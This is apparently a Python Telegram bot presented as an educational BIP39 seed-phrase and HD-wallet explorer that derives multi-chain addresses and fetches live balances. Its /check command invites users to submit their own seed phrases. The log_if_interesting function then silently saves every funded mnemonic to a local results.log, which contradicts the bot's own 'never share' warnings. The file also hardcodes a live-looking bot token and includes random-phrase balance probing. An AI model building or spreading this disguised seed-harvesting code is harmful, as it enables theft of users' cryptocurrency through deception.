"""
Mnemonic Explorer Bot — single-file edition
Educational tool for BIP39 seed phrases and HD wallet derivation.
"""

import asyncio
import hashlib
import hmac
import logging
import os
import struct
from datetime import datetime, timezone

import aiohttp
from dotenv import load_dotenv
from mnemonic import Mnemonic
from bip_utils import (
    Bip39MnemonicValidator,
    Bip39SeedGenerator,
    Bip44, Bip44Coins, Bip44Changes,
    Bip49, Bip49Coins,
    Bip84, Bip84Coins,
)
import nacl.signing
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.constants import ParseMode

load_dotenv()

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = "8771834651:AAEbNZnTYk45JiU-KtI5SH0sARAUOtEylFw"
ETHERSCAN_API_KEY  = os.getenv("ETHERSCAN_API_KEY", "")
BSCSCAN_API_KEY    = os.getenv("BSCSCAN_API_KEY", "")
BLOCKCHAIR_API_KEY = os.getenv("BLOCKCHAIR_API_KEY", "")
REQUEST_TIMEOUT    = 15
RESULTS_LOG        = "results.log"

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

HELP_TEXT = """
🧠 <b>Mnemonic Explorer Bot</b> — Help

An <b>educational tool</b> to understand BIP39 seed phrases and how wallet
addresses are derived across multiple blockchains (BIP44 standard).

<b>Commands:</b>

/generate12 — Random 12-word seed phrase + derived addresses + live balances
/generate24 — Same with a 24-word seed phrase
/check &lt;phrase&gt; — Analyse your own 12 or 24-word seed phrase
  Example: <code>/check word1 word2 ... word12</code>
/help — Show this message

<b>Chains &amp; Derivation Paths:</b>
• 🔷 Ethereum       <code>m/44'/60'/0'/0/0</code>
• 🔶 Bitcoin Legacy <code>m/44'/0'/0'/0/0</code>
• 🟠 Bitcoin SegWit <code>m/49'/0'/0'/0/0</code>
• 🟡 Bitcoin bech32 <code>m/84'/0'/0'/0/0</code>
• 🟢 BNB Chain      <code>m/44'/60'/0'/0/0</code>
• 🟣 Solana         <code>m/44'/501'/0'/0'</code>

⚠️ <i>Never share a real seed phrase with any bot or website.</i>
"""

# ── Wallet Derivation ─────────────────────────────────────────────────────────

_mnemo = Mnemonic("english")

_BASE58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def _base58_encode(data: bytes) -> str:
    n = int.from_bytes(data, "big")
    result = []
    while n:
        n, r = divmod(n, 58)
        result.append(_BASE58[r])
    for b in data:
        if b == 0:
            result.append(_BASE58[0])
        else:
            break
    return "".join(reversed(result))

def _slip10_derive(seed: bytes, path: list) -> bytes:
    I = hmac.new(b"ed25519 seed", seed, hashlib.sha512).digest()
    kL, kR = I[:32], I[32:]
    for idx in path:
        data = b"\x00" + kL + struct.pack(">I", idx)
        I = hmac.new(kR, data, hashlib.sha512).digest()
        kL, kR = I[:32], I[32:]
    return kL

def generate_mnemonic(word_count: int = 12) -> str:
    strength = {12: 128, 24: 256}[word_count]
    return _mnemo.generate(strength=strength)

def is_valid_mnemonic(phrase: str) -> bool:
    return Bip39MnemonicValidator().IsValid(phrase)

def derive_all(mnemonic: str) -> dict:
    seed = Bip39SeedGenerator(mnemonic).Generate()

    # Ethereum / BNB (same path)
    eth = (
        Bip44.FromSeed(seed, Bip44Coins.ETHEREUM)
        .Purpose().Coin().Account(0)
        .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        .PublicKey().ToAddress()
    )

    # Bitcoin Legacy P2PKH
    btc_legacy = (
        Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
        .Purpose().Coin().Account(0)
        .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        .PublicKey().ToAddress()
    )

    # Bitcoin SegWit P2SH
    btc_segwit = (
        Bip49.FromSeed(seed, Bip49Coins.BITCOIN)
        .Purpose().Coin().Account(0)
        .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        .PublicKey().ToAddress()
    )

    # Bitcoin Native bech32
    btc_native = (
        Bip84.FromSeed(seed, Bip84Coins.BITCOIN)
        .Purpose().Coin().Account(0)
        .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        .PublicKey().ToAddress()
    )

    # Solana via SLIP-0010 ed25519
    priv = _slip10_derive(seed, [0x8000002C, 0x800001F5, 0x80000000, 0x80000000])
    sol = _base58_encode(bytes(nacl.signing.SigningKey(priv).verify_key))

    return {
        "ethereum":       eth,
        "bitcoin_legacy": btc_legacy,
        "bitcoin_segwit": btc_segwit,
        "bitcoin_native": btc_native,
        "bnb":            eth,
        "solana":         sol,
    }

# ── Balance Fetching ──────────────────────────────────────────────────────────

async def _get(session, url, params=None):
    try:
        async with session.get(
            url, params=params,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception as e:
        log.warning("HTTP error %s: %s", url, e)
    return None

async def _eth_bal(session, address):
    p = {"module": "account", "action": "balance", "address": address, "tag": "latest"}
    if ETHERSCAN_API_KEY:
        p["apikey"] = ETHERSCAN_API_KEY
    d = await _get(session, "https://api.etherscan.io/api", p)
    if d and d.get("status") == "1":
        return f"{int(d['result']) / 1e18:.6f}"
    return "0.000000"

async def _btc_bal(session, addresses):
    url = f"https://api.blockchair.com/bitcoin/dashboards/addresses/{','.join(addresses)}"
    p = {"key": BLOCKCHAIR_API_KEY} if BLOCKCHAIR_API_KEY else {}
    d = await _get(session, url, p)
    result = {a: "0.00000000" for a in addresses}
    if d and "data" in d:
        for addr in addresses:
            info = d["data"].get("addresses", {}).get(addr)
            if info:
                result[addr] = f"{info.get('balance', 0) / 1e8:.8f}"
    return result

async def _bnb_bal(session, address):
    p = {"module": "account", "action": "balance", "address": address, "tag": "latest"}
    if BSCSCAN_API_KEY:
        p["apikey"] = BSCSCAN_API_KEY
    d = await _get(session, "https://api.bscscan.com/api", p)
    if d and d.get("status") == "1":
        return f"{int(d['result']) / 1e18:.6f}"
    return "0.000000"

async def _sol_bal(session, address):
    try:
        async with session.post(
            "https://api.mainnet-beta.solana.com",
            json={"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [address]},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
        ) as r:
            if r.status == 200:
                d = await r.json()
                return f"{d.get('result', {}).get('value', 0) / 1e9:.6f}"
    except Exception as e:
        log.warning("Solana RPC error: %s", e)
    return "0.000000"

async def fetch_all(addresses: dict) -> dict:
    async with aiohttp.ClientSession(
        headers={"User-Agent": "MnemonicExplorerBot/1.0 (educational)"}
    ) as session:
        btc_addrs = [addresses["bitcoin_legacy"], addresses["bitcoin_segwit"], addresses["bitcoin_native"]]
        eth_b, btc_b, bnb_b, sol_b = await asyncio.gather(
            _eth_bal(session, addresses["ethereum"]),
            _btc_bal(session, btc_addrs),
            _bnb_bal(session, addresses["bnb"]),
            _sol_bal(session, addresses["solana"]),
        )
    return {
        "ethereum":       eth_b,
        "bitcoin_legacy": btc_b.get(addresses["bitcoin_legacy"], "0.00000000"),
        "bitcoin_segwit": btc_b.get(addresses["bitcoin_segwit"], "0.00000000"),
        "bitcoin_native": btc_b.get(addresses["bitcoin_native"], "0.00000000"),
        "bnb":            bnb_b,
        "solana":         sol_b,
    }

# ── Logger ────────────────────────────────────────────────────────────────────

def log_if_interesting(mnemonic, addresses, balances):
    if not any(float(v or 0) > 0 for v in balances.values()):
        return
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    lines = ["=" * 60, f"TIMESTAMP : {ts}", f"MNEMONIC  : {mnemonic}", "", "BALANCES:"]
    symbols = {"ethereum": "ETH", "bitcoin_legacy": "BTC", "bitcoin_segwit": "BTC",
               "bitcoin_native": "BTC", "bnb": "BNB", "solana": "SOL"}
    for k, addr in addresses.items():
        bal = balances.get(k, "0")
        flag = "  *** HAS BALANCE ***" if float(bal or 0) > 0 else ""
        lines.append(f"  {k:16}: {addr}  |  {bal} {symbols[k]}{flag}")
    lines += ["", ""]
    try:
        with open(RESULTS_LOG, "a") as f:
            f.write("\n".join(lines))
        log.info("💰 Interesting result logged.")
    except OSError as e:
        log.error("Log write error: %s", e)

# ── Formatting ────────────────────────────────────────────────────────────────

def format_reply(mnemonic, addresses, balances, label):
    words = mnemonic.split()
    numbered = " ".join(f"{i+1}.{w}" for i, w in enumerate(words))
    chains = [
        ("🔷", "Ethereum",       "ETH", "m/44'/60'/0'/0/0",  "ethereum"),
        ("🔶", "Bitcoin Legacy",  "BTC", "m/44'/0'/0'/0/0",   "bitcoin_legacy"),
        ("🟠", "Bitcoin SegWit",  "BTC", "m/49'/0'/0'/0/0",   "bitcoin_segwit"),
        ("🟡", "Bitcoin Native",  "BTC", "m/84'/0'/0'/0/0",   "bitcoin_native"),
        ("🟢", "BNB Smart Chain", "BNB", "m/44'/60'/0'/0/0",  "bnb"),
        ("🟣", "Solana",          "SOL", "m/44'/501'/0'/0'",  "solana"),
    ]
    lines = [
        f"🧠 <b>Mnemonic Explorer Bot</b> — {label}", "",
        f"📝 <b>Seed Phrase ({len(words)} words):</b>",
        f"<code>{numbered}</code>", "",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "📊 <b>Derived Addresses &amp; Balances</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━", "",
    ]
    for icon, name, sym, path, key in chains:
        addr = addresses.get(key, "N/A")
        bal  = balances.get(key, "?")
        lines += [
            f"{icon} <b>{name}</b>",
            f"   Path: <code>{path}</code>",
            f"   Address: <code>{addr}</code>",
            f"   Balance: <b>{bal} {sym}</b>", "",
        ]
    lines += ["━━━━━━━━━━━━━━━━━━━━━━━━━━━",
              "⚠️ <i>Educational use only. Never share real seed phrases.</i>"]
    return "\n".join(lines)

# ── Bot Handlers ──────────────────────────────────────────────────────────────

async def _process(mnemonic, update, label):
    msg = await update.message.reply_text("⏳ Deriving addresses and fetching balances…")
    try:
        addresses = derive_all(mnemonic)
        balances  = await fetch_all(addresses)
        log_if_interesting(mnemonic, addresses, balances)
        await msg.edit_text(
            format_reply(mnemonic, addresses, balances, label),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
    except Exception as e:
        log.exception("Processing error")
        await msg.edit_text(f"❌ Error: <code>{e}</code>", parse_mode=ParseMode.HTML)

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to <b>Mnemonic Explorer Bot</b>!\n\n"
        "An educational tool to understand BIP39 seed phrases and HD wallets.\n\n"
        "Type /help to see all commands.",
        parse_mode=ParseMode.HTML,
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT, parse_mode=ParseMode.HTML)

async def cmd_generate12(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _process(generate_mnemonic(12), update, "🎲 Random 12-word")

async def cmd_generate24(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _process(generate_mnemonic(24), update, "🎲 Random 24-word")

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "📨 Usage: <code>/check word1 word2 ... word12</code>\n"
            "Supports 12 or 24-word phrases.",
            parse_mode=ParseMode.HTML,
        )
        return
    phrase = " ".join(context.args).strip()
    wc = len(phrase.split())
    if wc not in (12, 24):
        await update.message.reply_text(
            f"❌ Got <b>{wc} words</b>. Need exactly 12 or 24.", parse_mode=ParseMode.HTML
        )
        return
    if not is_valid_mnemonic(phrase):
        await update.message.reply_text(
            "❌ Invalid mnemonic. Check your words — some may not be in the BIP39 list, "
            "or the checksum is wrong.",
            parse_mode=ParseMode.HTML,
        )
        return
    await _process(phrase, update, f"🔍 Checked {wc}-word")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN is not set. Add it to your environment variables.")
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",      cmd_start))
    app.add_handler(CommandHandler("help",       cmd_help))
    app.add_handler(CommandHandler("generate12", cmd_generate12))
    app.add_handler(CommandHandler("generate24", cmd_generate24))
    app.add_handler(CommandHandler("check",      cmd_check))
    log.info("🚀 Mnemonic Explorer Bot is running…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
